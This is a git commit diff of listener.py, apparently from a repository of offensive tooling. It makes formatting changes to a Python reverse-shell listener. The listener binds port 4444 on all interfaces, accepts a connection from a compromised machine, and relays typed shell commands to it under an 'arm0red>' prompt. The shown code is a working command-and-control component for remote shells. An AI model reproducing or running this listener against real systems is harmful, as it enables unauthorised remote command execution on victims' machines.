484f3ec2857d9e3f4d747fd8f19685ee2f7d9314
Stephen Harris <trackmastersteve@users.noreply.github.com>
2018-10-06 12:10:52 -0700

    minor format changes

--- listener.py
+++ listener.py
@@ -3,7 +3,7 @@
 from socket import *
 
 HOST = '' # '' means bind to all interfaces
-PORT = 443 #  Port 
+PORT = 4444 #  Port 
 
 s = socket(AF_INET, SOCK_STREAM) # Create our socket handler
 s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port
@@ -11,11 +11,11 @@ s.bind((HOST, PORT)) # Bind to interface
 print("[*] Listening on 0.0.0.0:%s" % str(PORT)) # Print we are accepting connections
 s.listen(10) # Listen for only 10 connections
 conn, addr = s.accept() # Accept connections
-print("[*] Connected by", addr) # Print connected by ipaddress
+print("[+] Connected by", addr) # Print connected by ipaddress
 data = conn.recv(1024).decode("UTF-8") # Receive initial connection
 
 while 1: # Start loop
-    command = input("Enter shell command or quit> ") # Enter shell command
+    command = input("arm0red> ") # Enter shell command
     conn.send(bytes(command, "UTF-8")) # Send shell command
     if command == "quit":
         break # If we specify quit then break out of loop and close socket
